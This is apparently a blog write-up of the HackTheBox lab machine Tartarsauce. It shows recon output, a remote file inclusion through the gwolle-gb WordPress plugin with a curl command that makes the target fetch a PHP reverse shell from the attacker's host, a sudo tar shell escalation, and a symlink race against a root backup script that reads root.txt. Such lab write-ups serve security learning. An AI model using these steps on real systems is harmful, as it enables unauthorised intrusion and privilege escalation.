---
title: Tartarsauce
date: 2022-06-11 
categories: [HackTheBox, Medium]
tags: [writeup, linux]     # TAG names should always be lowercase
author: Derrick
---

![](https://i.imgur.com/EvyXmVu.png)

Tartarsauce is an odd box because I was never actually able to gain a root shell on it. The box deals a lot with using tar to pivot or escelate privileges. Its probably where the box got its name from. The author seemed to have a lot of fun putting little jokes throughout the box.

## Recon
---
`nmap -sVC 10.10.10.88`
``` 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-09 21:56 EDT
Nmap scan report for tartarsauce.htb (10.10.10.88)
Host is up (0.087s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds
```


Wpscan Results
```
 [+] gwolle-gb
 | Location: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2022-05-12T09:58:00.000Z
 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.2.2
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```
> You need to run an aggressive scan to find this pluggin
{: .prompt-warning }

Upon research into gwolle-gb, RFI is possible. In order to perform, have a file, preferably a php reverse shell, named wp-load.php and set it to root directory of your server. Run the curl command with the listener and reverse shell set up properly.

```
curl http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.19/
```

## User
---
Run `sudo -l` to discover:
```
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

[GTFObins](https://gtfobins.github.io/gtfobins/tar/#sudo) this

`sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

## Root
---
Interesting pspy output:
```
2022/06/11 01:14:10 CMD: UID=0    PID=28941  | /bin/bash /usr/sbin/backuperer
```

The script

```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Basically, its backing up the webroot and pauses for 30 sec. After 30 seconds, it checks to see if there has been any changes to the webroot and the archive it just created. Any changes get diffed. Since diff outputs the differences and outputs into a file AND this is run as root, this is essentially root file read. Within that 30 second gap, remove an existing file and replace it with a symlink to root.txt. To see when the script executes, pay attention to pspy.

Demo:
```
www-data@TartarSauce.htb: $ ls 
index.html  robots.txt  webservices
www-data@TartarSauce.htb: $ echo fart > lmao.txt 
rm lmao.txt; ln -s /root/root.txt lmao.txt
www-data@TartarSauce.htb: $ ls
index.html  lmao.txt  robots.txt  webservices
www-data@TartarSauce.htb: $ cat /var/backups/onuma_backup_error.txt
[...]
------------------------------------------------------------------------ 
Integrity Check Error in backup last ran :  Sat Jun 11 01:24:15 EDT 2022
------------------------------------------------------------------------ 
/var/tmp/.b3db02ba045c0199cd5b9959f56dd73c3be1bd5e   
diff -r /var/www/html/lmao.txt /var/tmp/check/var/www/html/lmao.txt
1c1        
< 45e29bf14bc90a46f46d670baadffcab
---
> fart
```

This POC works. Just add in the `/root/root.txt` file and this should be pwned :)